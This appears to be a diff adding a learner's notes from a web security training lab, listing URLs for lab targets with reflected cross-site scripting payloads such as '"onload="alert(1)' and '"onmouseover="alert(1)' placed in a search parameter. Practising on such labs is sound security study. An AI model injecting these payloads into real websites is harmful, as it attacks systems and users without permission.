@@ -1,0 +1,7 @@
+parameter : 'https://target-LAB-ID.web-security-academy.net/post' '"onload="alert(1)'
+
+https://target-acf11fa41f83ca7a80bc0f2c00a40078.web-security-academy.net/?search=helloo
+
+https://target-ac651fbd1feb9a398071446a00f0005e.web-security-academy.net/?search="onload="alert(1)
+
+https://target-ac651fbd1feb9a398071446a00f0005e.web-security-academy.net/?search="onmouseover="alert(1)
